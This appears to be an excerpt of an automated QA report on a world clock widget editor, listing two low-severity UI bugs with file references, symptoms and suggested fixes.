- **⚪ Low · dead-end** — Editor: a saved destination whose tz|label is not in the curated CITIES list is counted but has no chip and cannot be deselected
  - `public/editor-worldclock.html:320-327 (buildCityGrid) and :326 (city-count)`
  - **Breaks:** An editor opens a worldclock config (from the API, a future AI build, or a hand-edited config) containing a destination whose exact tz|label is absent from the 28-entry curated list, e.g. {tz:'Europe/London', label:'Head office'}. The picker shows e.g. '5 of 12 selected' but only 4 chips are highlighted; the user cannot find or remove the 5th destination in the grid and only sees an unexplained extra clock in the preview.
  - **Fix:** In buildCityGrid, after rendering the curated chips, append an is-on chip for every C.destinations entry not found in CITIES (using its own label/cc and its keyOf as data-key) so each selected destination is visible and removable, and the count always matches the highlighted chips. The existing click handler would need to resolve such chips from C.destinations rather than only CITIES.
- **⚪ Low · ux-ui** — Editor allows an accent colour that renders the day/night marker invisible against the row background
  - `public/editor-worldclock.html:373-377 (wireColour) and :227 (hexOk); consumed at public/widget-worldclock.js:186 (.wc-dn color:${c.accent})`
  - **Breaks:** An editor sets the accent to #FFFFFF or a near-white hex on the default light theme. The sun/moon day/night marker becomes invisible in both the live preview and the published widget with no warning, so the user may believe the day/night feature is broken.
  - **Fix:** Warn in-editor when the chosen accent's luminance is close to the row background, constrain the picker to colours with adequate contrast, or render the marker with a subtle contrasting outline/stroke so it stays visible at any accent value.

---

_Generated 2026-07-09 from a 98-agent verified QA sweep. Findings marked "plausible" could not be fully proven from source alone (they depend on runtime config or data) but are likely real. The 4 rejected findings were dropped as false positives during verification._
